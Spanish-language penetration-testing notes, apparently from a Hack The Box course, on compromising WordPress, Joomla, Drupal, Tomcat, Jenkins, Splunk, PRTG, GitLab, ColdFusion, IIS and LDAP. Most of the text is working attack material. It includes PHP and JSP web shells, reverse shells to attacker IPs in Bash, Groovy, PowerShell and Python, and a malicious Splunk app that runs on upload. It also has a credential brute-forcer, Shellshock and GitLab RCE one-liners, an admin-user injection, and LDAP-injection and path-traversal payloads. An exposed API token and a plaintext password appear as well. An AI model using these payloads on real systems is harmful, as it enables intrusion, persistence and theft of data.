Hay una herramienta llamada eyewitness que es como un escaneo de nessus que va bastante bien para estas aplicaciones.
# Para ver archivos .psafe3
Si tiene pass con 
`pwsafe2john Employee-Passwords_OLD.psafe3 > hash.txt `

y lo rompemos 
`john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`

y lo abrimos:
`pwsafe -r Employee-Passwords_OLD.psafe3`

xfreerdp /v:172.16.119.7 /u:hwilliam /p:'dealer-screwed-gym1' /dynamic-resolution /drive:linux,.

# wpscan
#### Completo
```
wpscan --rua -e i,dbe,p,t --url [URL] --api-token fdGa3SahnfsIyt4fqax5uWcav9pUOz73pDoPMtGffBk  
```
#### Password Attack
```
sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url [URL]
```

#### Para tener una webshell en wordpress una vez dentro
```
Appearance > Theme Editor > (Un tema como el de twentyNineteen) > 404.php
```
Y ahí añadimes la webshell que queramos, una sencilla y rapida:
```
<?php system($_GET['x']); ?>

o

system($_GET[x]); #Podemos meter esto por en medio random
```
>[!Nota]
>Si en vez de `x` ponemos alguna cosa super random va a ser mas seguro a la hora de hacer nuestras auditorías por ejemplo: `dcfdd5e021a869fcc6dfaef8bf31377e` y después llamamos a ese parámetro en vez de a x


Una vez subido vamos a ese tema: 
`http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?x=id`
o
`http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id`

También podemos hacer esto desde metasploit: `unix/webapp/wp_admin_shell_upload`
# Joomla

Rutas curiosas:
```
[URL]/administrator/manifests/files/joomla.xml

[URL]/plugins/system/cache/cache.xml
```

#### Instalación de droopescan/joomscan
```
sudo pip3 install droopescan

o

curl https://pyenv.run | bash
echo 'export PYENV_ROOT="$HOME/.pyenv"' >> ~/.bashrc
echo 'command -v pyenv >/dev/null || export PATH="$PYENV_ROOT/bin:$PATH"' >> ~/.bashrc
echo 'eval "$(pyenv init -)"' >> ~/.bashrc
source ~/.bashrc
pyenv install 2.7
pyenv shell 2.7
python2.7 -m pip install urllib3
python2.7 -m pip install certifi
python2.7 -m pip install bs4
```

#### Comandos básicos
```
droopescan scan joomla --url [URL] #Escaneo básico 

o

python2.7 joomlascan.py -u [URL] #Escaneo básico
```
##### Bruteforcing:
https://github.com/ajnik/joomla-bruteforce
```
sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w [WORDLIST] -usr [USER]
```

#### Para la webshell aquí
El login bueno es en `/administrator/`
```
Options > Templates > Templates(debajo de Styles) > (Seleccionamos una por ejemplo protostar detils and files) > error.php
```
Y ahí añadimes la webshell que queramos, una sencilla y rapida:
```
<?php system($_GET['x']); ?>

o

system($_GET[x]); #Podemos meter esto por en medio random sin romper nada
```

Y accedemos desde:
```
[URL]/templates/protostar/error.php?x=id
```


# Drupal
#### Rutas interesantes
```
/CHANGELOG.txt
/README.txt
```

#### Usuarios por defecto
```
Administrator
Authenticated User
Anonymous
```

#### Comandos
```
droopescan scan drupal -u http://drupal.inlanefreight.local
```

#### Ataque
##### (Por debajo del 8 en versiones viejunas)
Una vez logueados como admin se podía ir a modules y poder habilitar el `php filter` y guardamos

Después vamos a Content > Add content > Basic Page
Y ahi podemos añadir nuestra webshell de confianza:
```
<?php system($_GET['x']); ?>

o

system($_GET[x]); #Podemos meter esto por en medio random sin romper nada
```
IMPORTANTE PONER DEBAJO EN `Text format` PONER `PHP code`
Y vamos a ella en:
```
[URL]/node/3?x=id
```

##### (En las versiones por encima de la 8)
En esta el modulo no está instalado de default así que vamos a ello, primero nos lo descargamos:

```
wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
```

Después vamos a `Administration` > `Reports` > `Available updates` (Puede variar entre versiones)

Desde ahí le damos a instalar y subimos el fichero que nos acabamos de descargar.



Otra forma es subiendo un backdoored Module, vamos a verlo para ello primero lo descargamos:
```
wget --no-check-certificate https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz

tar xvf captcha-8.x-1.2.tar.gz
```

Y creamos también una webshell.php básica llamándola por ejemplo `shell.php`:
```
<?php system($_GET['x']); ?>
```

Y tambien creamos un `.htaccess` con lo siguiente:
```
<IfModule mod_rewrite.c> RewriteEngine On RewriteBase / </IfModule>
```
La configuración anterior aplicará reglas para la carpeta / cuando solicitemos un archivo en /modules.

Ahora hacemos carpeta con todo y comprimimos:
```
mv shell.php .htaccess captcha

tar cvf captcha.tar.gz captcha/
```

Después de esto entramos con permisos administrativos a la web y vamos a Manage > Extend > + Install new module. Desde la página a la que nos lleva subimos el zip y lo instalamos.

Después de subirlo vamos a la ruta:
```
[URL]/modules/captcha/shell.php?x=id
```

#### Vulnerabilidades conocidas
Existen 3 vulns conocidas vamos a ver cada una de ellas y su explotración:
##### Drupalgeddon
https://www.exploit-db.com/exploits/34992
```
python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd
```
Crea usuarios
##### Drupalgeddon2
https://www.exploit-db.com/exploits/44448
```
python3 drupalgeddon2.py
```
Este script crea un archivo en la web, si lo modificamos podemos subir una webshell

##### Drupalgeddon3
Para este requerimos de un user que pueda eliminar un nodo
Otro requisito es tener una cookie de sesión válida de ese usuario (Con iniciar sesión la deberíamos de tener fácilmente)

Después desde metasploit con el módulo de `multi/http/drupal_drupageddon3`:
Si funciona obtenemos una shell directamente.

# Apache Tomcat
## Fingerprinting
Si esta mal configurado podemos forzar la web a un error y que nos muestre la version de tomcat que se usa. Podemos hacerlo simplemente dirigiendonos a un endpoint que no exista en la web.

Otra buena cosa a ver que los administradores no pueden eliminar de la isntalacion de tomcat es /docs/ , podemos verlo con `curl -s [URL]:8080/docs/ | grep Tomcat` . Y veremos esta estructura:

```
├── bin
├── conf
│   ├── catalina.policy
│   ├── catalina.properties
│   ├── context.xml
│   ├── tomcat-users.xml
│   ├── tomcat-users.xsd
│   └── web.xml
├── lib
├── logs
├── temp
├── webapps
│   ├── manager
│   │   ├── images
│   │   ├── META-INF
│   │   └── WEB-INF
|   |       └── web.xml
│   └── ROOT
│       └── WEB-INF
└── work
└── Catalina
└── localhost`
```

Dentro de cada subcarpeta de webapps encontraremos una estructura como esta:

```
webapps/customapp
├── images
├── index.jsp
├── META-INF
│     └── context.xml
├── status.xsd
└── WEB-INF
	├── jsp
	|      └── admin.jsp
	└── web.xml
	└── lib
	|      └── jdbc_drivers.jar
	└── classes
	└── AdminServlet.class`
```

El archivo mas importante es el `WEB-INF/web.xml` donde se puede encontrar la lógica de negocio.
Otro archivo importante a revisar es el `tomcat-users.xml` ya que normalmente muestra como permite/deniega por permisos en la web y a que vistas en concreto, por lo que será más endpoints que revisar en busca de vulnerabilidades.

Credenciales por defecto de tomcas suelen ser:
`tomcat:tomcat`
`admin:admin`
## Ataque
### En busca de credenciales
Desde metasploit podemos usar el módulo de `scanner/http/tomcat_mgr_login`
Esto hará una ataque de fuerza bruta con credenciales básicas y por defecto. Pero esto podemos hacerlo perfectamente desde burp o con hydra inlcuso.

Para el mismo fin tambien podemos usar este script:
```python
#!/usr/bin/python

import requests
from termcolor import cprint
import argparse

parser = argparse.ArgumentParser(description = "Tomcat manager or host-manager credential bruteforcing")

parser.add_argument("-U", "--url", type = str, required = True, help = "URL to tomcat page")
parser.add_argument("-P", "--path", type = str, required = True, help = "manager or host-manager URI")
parser.add_argument("-u", "--usernames", type = str, required = True, help = "Users File")
parser.add_argument("-p", "--passwords", type = str, required = True, help = "Passwords Files")

args = parser.parse_args()

url = args.url
uri = args.path
users_file = args.usernames
passwords_file = args.passwords

new_url = url + uri
f_users = open(users_file, "rb")
f_pass = open(passwords_file, "rb")
usernames = [x.strip() for x in f_users]
passwords = [x.strip() for x in f_pass]

cprint("\n[+] Atacking.....", "red", attrs = ['bold'])

for u in usernames:
    for p in passwords:
        r = requests.get(new_url,auth = (u, p))

        if r.status_code == 200:
            cprint("\n[+] Success!!", "green", attrs = ['bold'])
            cprint("[+] Username : {}\n[+] Password : {}".format(u,p), "green", attrs = ['bold'])
            break
    if r.status_code == 200:
        break

if r.status_code != 200:
    cprint("\n[+] Failed!!", "red", attrs = ['bold'])
    cprint("[+] Could not Find the creds :( ", "red", attrs = ['bold'])
#print r.status_code
```
Con el -h podremos ver ayuda de este script

Wordlist buena para esto: `/usr/share/metasploit-framework/data/wordlists/` Y dentro de aqui:
`/tomcat_mgr_default_userpass.txt`
`/tomcat_mgr_default_userpass.txt`
`/tomcat_mgr_default_users.txt`
### Una vez dentro
Nos dirigimos a `/manager/html` y nos permitirá subir un archivo .war que es parecido a un zip. Vamos a coger una webshell JSP para esto:
```Java
<%@ page import="java.util.*,java.io.*"%>
<%
//
// JSP_KIT
//
// cmd.jsp = Command Execution (unix)
//
// by: Unknown
// modified: 27/06/2003
//
%>
<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<%
if (request.getParameter("cmd") != null) {
        out.println("Command: " + request.getParameter("cmd") + "<BR>");
        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
                out.println(disr); 
                disr = dis.readLine(); 
                }
        }
%>
</pre>
</BODY></HTML>
```

O lo directamente desde github y lo comprimimos:
```
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp

zip -r backup.war cmd.jsp
```

Entonces en la web le damos a `Browse` y le damos a `Deploy`.
Si hemos cogido la de github veremos que se añade `/backup` a la aplicación.

Una vez subido si vamos a `/backup/cmd.jsp` podremos añadir `?cmd=[COMANDO]` para ejecutar comandos en la webshell.

Después de usarla podemos darle a undeploy a la web y así desactivarla por limpieza.

Otra opción es hacerse una reverse directamente, para hacerlo de una manera sencilla podemos hacerlo con msfvenom: `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war`
Después de esto solo deberemos de ponernos a la escucha con netcat y clickear en `/backup` que acabamos de añadir en el panel de administradores.

## CVE-2020-1938: Ghostcat (LFI)
Script: https://web.archive.org/web/20260130182638/https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi

El exploit solo puede leer archivos y carpetas dentro de la carpeta de aplicaciones web
```
python2.7 tomcat-ajp.lfi.py app-dev.inlanefreight.local -p 8009 -f WEB-INF/web.xml
```

## Tomcat CGI

Hay un CVE importante en Tomcat CGI: CVE-2019-0232
`Versions `9.0.0.M1` to `9.0.17`, `8.5.0` to `8.5.39`, and `7.0.0` to `7.0.93` of Tomcat are affected.`
Y se debe a una mala configuración en `enableCmdLineArguments` el cual en rutas legitimas de la aplicación como `http://example.com/cgi-bin/booksearch.cgi?action=title&query=the+great+gatsby` gracias a la mala configuración si añadimos `&` y un comando después en la misma URL legítima podremos ejecutar comandos.

>[!Nota]
>Para ver la versión podremos hacerlo con nmap

Si encontramos un endpoint `/cgi/` y un .bat podremos aprovecharnos de esto. Para ello podremos usar ffuf:
```
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat
```

Por ejemplo si encontráramos el endpoint: `/cgi/welcome.bat` podremos aprovechar esta vulnerabilidad, por ejemplo, añadiendo `?&whoami`

Si por ejemplo no estuviera el comando whoami como es el caso del ejemplo de HTB, podemos ver si esta en el path con el comando `set` para asegurarse de que no está. Entonces necesitaríamos codificar directamente en la URL :
```
http://10.129.204.227:8080/cgi/welcome.bat?&c:\windows\system32\whoami.exe

http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
```
# Jenkings

## Fingerprinting
Jenkins se puede instalar en Windows, siempre que este en Windows este tendrá privilegios de SYSTEM por lo que si logramos vulnerarlos tendremos un compromiso muy bueno y podremos enumerar el AD.

Credencuales por defecto del panel: `admin:admin`

## Ataque a Jenkings
Una vez dentro si accedemos a `/script` poder ver una consola de comandos, podemos ejecutar scripts de Apche Groovy. Podemos usar esto a nuestro favor para ejecutar comandos:
```
def cmd = 'id'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout
```

O ejecutar directamente una  reverse:
```
#PODEMOS USAR ESTA SI ES LINUX

r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()


# O PODEMOS USAR TAMBIEN ESTA SI ES WINDOWS:

String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
==(Hay que ponerse antes a la escucha!!)==

Against a Windows host, we could attempt to add a user and connect to the host via RDP or WinRM or, to avoid making a change to the system, use a PowerShell download cradle with [Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1). We could run commands on a Windows-based Jenkins install using this snippet:

```
def cmd = "cmd.exe /c dir".execute();
println("${cmd.text}");
```

Vulnerabilidades de CVE-2018-1999002 and CVE-2019-1003000 recientemente se han explotado juntas para obtener ejecución remota de código pero no se explica en HTB.

# Splunk

## Fingerprint
Aunque es poco posible a veces Splunk se puede encontrar disponible desde el exterior. Este normalmente tendra permisos de administrador tanto en entornos linux como windows.

Las credenciales por defecto son: `admin:changeme`

Otra cosa a tener en cuenta que la version enterprise si haces la prueba a los 60 días pasa a la gratuita, si esto pasa la cuenta ya no necesitara autenticación y se podrá entrar sin credenciales. A los administradores se les suele olvidar estas cosas.

Splunk cuenta con diversas vulnerabilidades a lo largo de sus versiones, tampoco se ve en HTB pero habría que revisarlas.

## Attacking Splunk
Para ello primero creamos una aplicacion de splunk personalizada.
Para que sea mas facil podemos coger directamente este: https://github.com/0xjpuff/reverse_shell_splunk

No obstante se puede hacer a mano, para ello necesitamos una carpeta con esta estructura:
```
splunk_shell/
├── bin
└── default
```

El directorio de bin contará con el/los scripts a ejecutar y el default tendra nuestros inputs.conf (El comando a ejecutar). Hay que tener en cuenta lo que vamos a ejecutar para saber que scripts y configuracion metemos.

Vamos a tener en cuenta que vamos a querer usar una reverse de PowerShell oneliner.

Por lo que deberemos de crear `/default/inputs.conf` con lo siguiente:
```
[script://./bin/rev.py]
disabled = 0  
interval = 10  
sourcetype = shell 

[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10
```

Y también necesitaremos en bin unos cuantos vamos a hacerlos
1. `/bin/run.bat`
```
@ECHO OFF
PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
Exit
```

2. `/run.ps1`
```
#A simple and small reverse shell. Options and help removed to save space. 
#Uncomment and change the hardcoded IP address and port number in the below line. Remove all help comments as well.
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.15',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

3. Este se escribiría sustituyendo al anterior si fuera un entorno ==LINUX== `/bin/rev.py`
```
import socket,os,pty
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("[TU_IP]",443))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/bash")
```

Una vez creado todo lo comprimimos con el siguiente comando: 
```
tar -cvzf updater.tar.gz splunk_shell/
```

Una vez creada volvemos al panel de administrador que hemos accedido en Splunk y le damos a la izquierda en el dibujo del engranaje al lado de `APPS` esto nos llevara a la pagina de gestión de apps de Splunk.

>[!Caution]
>Antes de terminar de subir el archivo malicioso deberemos de ponernos a la escucha por que se ejecutara directamente al subirlo

Una vez ahí le damos arriba a la derecha `Install app from file` y subimos nuestra aplicación.

Y ya tendríamos nuestra reverse ejecutada.

# PRTG
Es un sistema de monitorización de red, es ampliamente usado en aeropuertos. A lo largo del tiempo se han reportado 26 vulnerabilidades pero solo se cuentan con 4 PoCs accesibles.
## Fingerprinting
Cuando lancemos el escaneo de puertos con nmap a una IP podremos ver algo asi:
`8080/tcp open http Indy httpd 17.3.33.2830 (Paessler PRTG bandwidth monitor)`

Credenciales por defecto: `prtgadmin:prtgadmin` o Password123

## Ataque a PRTG
### CVE-2018-9276
Esta vulnerabilidad se aprovecha de que todos los avisos de la aplicación primero pasan por powershell. Este es para la versión 17.3.33.2830 de PRTG, primero podemos ver la version con un simple curl:
```
curl -s http://[IP]:8080/index.htm -A "Mozilla/5.0 (compatible; MSIE 7.01; Windows NT 5.0)" | grep version
```
Una vez confirmado la versión y una vez dentro de la aplicación nos dirigimos a: Setup > Account Settings > Notifications > Add New Notification.

Una vez ahí le ponemos un nombre de notificación, el que queramos, y vamos a la parte de abajo y le damos a `ESECUTE PROGRAM`.

Después nos vamos a Program File > Demo exe notification - outfile.ps1.

Por último en el campo de `parameter` ingresamos nuestro comando, por ejemplo crear un usuario:
```
test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add
```
Y le damos a save.

Después para que se ejecute nos vamos a la página de notificaciones y veremos nuestra notificación en la lista. (Esta notificación se podría haber programado para poder ejecutar persistencia a lo largo de la auditoría). Ahora solo quedaría darle al botón de ==Test== y ejecutaremos nuestra notificación.

### Modulo de metasploit
https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/windows/http/prtg_authenticated_rce.md

```
msfconsole

use exploit/windows/http/prtg_authenticated_rce

set PAYLOAD windows/meterpreter/reverse_tcp

## Y ya ponemos bien todas las opciones como siempre
```

# OsTicket
Es un software de ticketing de gestión de incidencias.

## Fingerprinting
Este no podremos hacer un escaneo de nmap por que nos saldra un server de apache o IIS, para descubrirlo tendremos que navegar a las webs y en la parte inferior de la web suele salir algo como "Powered by OsTicket" o "Support Ticket System". Tambien podremos fijarnos por que al acceder a la web nos dará una cookie con el nombre: "OSTSESSID"

## Ataque a OsTicket
### [CVE-2020-24881](https://nvd.nist.gov/vuln/detail/CVE-2020-24881)
Este es un SSRF ahi seria explotarlo , a parte tambien tiene SQLi y XSS

### Triquiñuela
Una forma curiosa de aprovechar esto un atacante seria enviar un ticket oficial ahi a esa página como si fuera alguien legítimo.
A la hora de subir un ticket nos da una confirmación y nos da un email de esa empresa generado automaticamente como `1234@empresa.com` el cual nos serviría para entrar a la web de tickets y poder ver nuestro ticket. El problema esta en que tenemos el @empresa.com, por lo que si vamos a gitbucket, github, un servicio de chat como slack, una wiki o alguno de estos y nos registramos con el email de empresa podremos usar este buzón creado por la aplicación para seguir nuestro ticket para recibir los emails de verificación

En HTB te muestran un ejemplo de que unas credencial3es de dehased pueden entrar al panel login de la web y ver los chats de tickets donde hay mas contraseñas para seguir pivotando.

# GitLab
Herramienta para alojar repositorios Git que ofrece funcionalidades de wiki. Parecida a Github y BitBucket.

## FingerPrinting
Si encontramos un subdominio de Gitlab podríamos intentar acceder, para ello podríamos coger credenciales de filtradas por internet a ver si tuviéramos suerte.

Para obtener la versión de GitLab solo podremos hacerlo desde el endpoint `/help` una vez iniciado sesión.

Otra ruta con bastante información será `/explore` 

Otra cosa a hacer una vez dentro sería si no tienen bien configurado la creación de cuentas para crearnos una cuenta en ese proyecto y tener persistencia.
A la hora de crear cuentas,, mediante errores, también podremos enumerar cuentas existentes. Incluso si el sing-up esta deshabilitado podremos ir a `/users/sign_up` y probar allí directamente la enumeración de usuarios.
## Ataque a GitLab
No se recomienda lanzar exploits al tun tun por si peta la aplicación, por lo que si no vemos una versión clara asociado a un exploit como este caso: https://www.exploit-db.com/exploits/49821 no deberíamos de tirar uno tras otro probando.

Para el de enumeración de usuarios podemos intentar este script: https://github.com/dpgg101/GitLabUserEnum.git:
```
python3 gitlab_userenum.py --url [URL] --userlist [DICCIONARIO_USERS.TXT]
```

### RCE
Para la versión 13.10.2 hay un exploit de RCE: https://www.exploit-db.com/exploits/49951, para este necesitamos credenciales vállidas:
```
python3 gitlab_13_10_2_rce.py -t [URL] -u [USER] -p [PASSWORD] -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f '
```
# ShellShock CGI
 [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271) 
La vulnerabilidad Shellshock permite a un atacante explotar versiones antiguas de Bash que guardan incorrectamente las variables de entorno. Normalmente, al guardar una función como variable, la función de shell se detiene donde el creador la define. Las versiones vulnerables de Bash permiten a un atacante ejecutar comandos del sistema operativo que se incluyen después de una función almacenada en una variable de entorno. Veamos un ejemplo sencillo donde definimos una variable de entorno e incluimos un comando malicioso a continuación.
```
$ env y='() { :;}; echo vulnerable-shellshock' bash -c "echo not vulnerable"
```
Si el sistema no es vulnerable, solo `"not vulnerable"`se imprimirá.

Primero apra el ataque buscamos la ruta:
```
gobuster dir -u http://10.129.204.231/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
```

Una vez descubierto en endpoint podremos explotarlo con:
```
curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/pas
swd' bash -s :'' http://10.129.204.231/cgi-bin/access.cgi
```
O directamente una reverse:
```
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' http://10.129.204.231/cgi-bin/access.cgi
```

Es a través del user agent, esto lo vimos en [[💀 Shell Shock - Bashdoor]]

# Thick client applications
Thick client applications son aquellas que se instalan localmente en nuestros ordenadores. A diferencia de las aplicaciones de cliente ligero, que se ejecutan en un servidor remoto y se acceden a través del navegador web, estas aplicaciones no requieren conexión a internet para funcionar y ofrecen un mejor rendimiento en cuanto a potencia de procesamiento, memoria y capacidad de almacenamiento.

Para ello una vez dentro de un servidor podremos ver las aplicaciones que corren y el objetivo será revisar el código de dicha aplicación en busca de credenciales.

Es un jaleo que flipas de binarios y programas, aquí esta todo:
https://academy.hackthebox.com/app/module/113/section/2139

## Explotando Vulnerabilidades web en thick client applications
Igual que lo anterior, todo mejor en:
https://academy.hackthebox.com/app/module/113/section/2164


# ColdFusion
Normalmente se usa en aplicaciones webs
## Fingerprinting
Hay diferentes maneras:

| **Método**        | **Descripción**                                                                                                                                                                                                                                                                                      |
| ----------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Port Scanning`   | ColdFusion suele usar el puerto 80 para HTTP y el puerto 443 para HTTPS por defecto. Por lo tanto, escanear estos puertos puede indicar la presencia de un servidor ColdFusion. Nmap podría identificar ColdFusion específicamente durante un escaneo de servicios. == 8500 ES EL SUYO POR DEFECTO== |
| `File Extensions` | Las páginas de ColdFusion suelen usar las extensiones de archivo ".cfm" o ".cfc". Si encuentra páginas con estas extensiones, podría ser un indicador de que la aplicación utiliza ColdFusion.                                                                                                       |
| `HTTP Headers`    | Compruebe los encabezados de respuesta HTTP de la aplicación web. ColdFusion suele establecer encabezados específicos, como "Server: ColdFusion" o "X-Powered-By: ColdFusion", que pueden ayudar a identificar la tecnología que se está utilizando.                                                 |
| `Error Messages`  | Si la aplicación utiliza ColdFusion y se producen errores, los mensajes de error pueden contener referencias a etiquetas o funciones específicas de ColdFusion.                                                                                                                                      |
| `Default Files`   | ColdFusion crea varios archivos predeterminados durante la instalación, como "admin.cfm" o "CFIDE/administrator/index.cfm". Encontrar estos archivos en el servidor web puede indicar que la aplicación web se ejecuta en ColdFusion.                                                                |

## Ataque a ColdFusion
Depende de la versión habrá un exploit u otro. Para el ejemplo será  ColdFusion 8.

Primero buscamos con searchsploit:
```
searchsploit adobe coldfusion
```

Y vemos dos, un path traversal y un RCE.

### Path traversal

```
searchsploit -p 14641

cp /usr/share/exploitdb/exploits/multiple/remote/14641.py . 

python2 14641.py
```

Consiste en que veremos una URL como la siguiente:
```
http://example.com/index.cfm?directory=
```

Por lo que podremos hacer path traversal:
```
http://example.com/index.cfm?directory=../../../etc/&file=passwd
```

O en el de mappings, el bueno seria: `http://www.example.com/CFIDE/administrator/settings/mappings.cfm?locale=en` por lo que:
```
http://www.example.com/CFIDE/administrator/settings/mappings.cfm?locale=../../../../../etc/passwd
```

Un archivo jugoso de ver de ColdFusion es `password.properties` ya que guarda contraseñas cifradas y la ruta siempre es `[cf_root]/lib` por lo que en este caso sería: `../../../../../../../../ColdFusion8/lib/password.properties`

### RCE no authenticado
Para este buscamos el otro que salía para esta versión 8 con searchsploit también:
```
searchsploit -p 50057

cp /usr/share/exploitdb/exploits/cfm/webapps/50057.py .

python3 50057.py
```

# Servidor Windows IIS

Server de windows, ya sabemos como funciona esto lo hemos visto muchas veces

## Fingerprinting
Nmap sencillo y vemos que se trata de IIS server

## Atacking IIS shortname tilde vulnerability
El shortname de siempre: https://github.com/irsdl/IIS-ShortName-Scanner
```
git clone https://github.com/irsdl/IIS-ShortName-Scanner.git

wget https://download.oracle.com/java/21/latest/jdk-21_linux-x64_bin.deb
sudo apt install ./jdk-21_linux-x64_bin.deb

cd IIS-ShortName-Scanner/release/
java -jar iis_shortname_scanner.jar 0 5 http://[IP]/
```

Pero el modulo de metasploit es mucho mas rápido.
Cuando lo muestre podremos hacer una wordlist y tratar de hacerle fuzzing para terminar de ver el archivo.
Esto se podrá hacer a través del siguiente comando:
```
egrep -R ^[RESULTADO_DEL_SHORTNAME_SCANNER] /usr/share/wordlists/ | sed 's/^[^:]*://' > /tmp/list.txt
```

Ejemplo:
```
egrep -R ^transf /usr/share/wordlists/ | sed 's/^[^:]*://' > /tmp/list.txt
```

>[!Caution]
>Importante el "^" de antes del nombre

Una vez creada la lista le hacemos fuzzing:
```
gobuster dir -u http://[IP]/ -w /tmp/list.txt -x .aspx,.asp
```

# LDAP
Sistema consultar el AD puerto 389

Podemos hacer consultas sobre el AD directamente con ldapsearch:
```
ldapsearch -H ldap://ldap.example.com:389 -D "cn=admin,dc=example,dc=com" -w secret123 -b "ou=people,dc=example,dc=com" "(mail=john.doe@example.com)"
```

## LDAP Inyection
Muy parecido a SQLInyection, también se da en paneles web de LDAP.

|Input|Description|
|---|---|
|`*`|An asterisk `*` can `match any number of characters`.|
|`( )`|Parentheses `( )` can `group expressions`.|
|`\|`|A vertical bar `\|` can perform `logical OR`.|
|`&`|An ampersand `&` can perform `logical AND`.|
|`(cn=*)`|Input values that try to bypass authentication or authorisation checks by injecting conditions that `always evaluate to true` can be used. For example, `(cn=*)` or `(objectClass=*)` can be used as input values for a username or password fields.|

```
$username = "*"; $password = "dummy"; (&(objectClass=user)(sAMAccountName=$username)(userPassword=$password))

O

$username = "dummy"; $password = "*"; (&(objectClass=user)(sAMAccountName=$username)(userPassword=$password))
```

Es decir que si vemos un panel login y que esta corriendo ldap en el 389 podría estar levantado un servicio web de LDAP y si pusiéramos en contraseña y username `*` podríamos bypasear el login.


# Menciones honoríficas de otras aplicaciones comunes

| Application                                                                 | Abuse Info                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
| --------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| [Axis2](https://axis.apache.org/axis2/java/core/)                           | This can be abused similar to Tomcat. We will often actually see it sitting on top of a Tomcat installation. If we cannot get RCE via Tomcat, it is worth checking for weak/default admin credentials on Axis2. We can then upload a [webshell](https://github.com/tennc/webshell/tree/master/other/cat.aar) in the form of an AAR file (Axis2 service file). There is also a Metasploit [module](https://packetstormsecurity.com/files/96224/Axis2-Upload-Exec-via-REST.html) that can assist with this.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
| [Websphere](https://en.wikipedia.org/wiki/IBM_WebSphere_Application_Server) | Websphere has suffered from many different [vulnerabilities](https://www.cvedetails.com/vulnerability-list/vendor_id-14/product_id-576/cvssscoremin-9/cvssscoremax-/IBM-Websphere-Application-Server.html) over the years. Furthermore, if we can log in to the administrative console with default credentials such as `system:manager` we can deploy a WAR file (similar to Tomcat) and gain RCE via a web shell or reverse shell.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          |
| [Elasticsearch](https://en.wikipedia.org/wiki/Elasticsearch)                | Elasticsearch has had its fair share of vulnerabilities as well. Though old, we have seen [this](https://www.exploit-db.com/exploits/36337) before on forgotten Elasticsearch installs during an assessment for a large enterprise (and identified within 100s of pages of EyeWitness report output). Though not realistic, the Hack The Box machine [Haystack](https://youtube.com/watch?v=oGO9MEIz_tI&t=54) features Elasticsearch.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
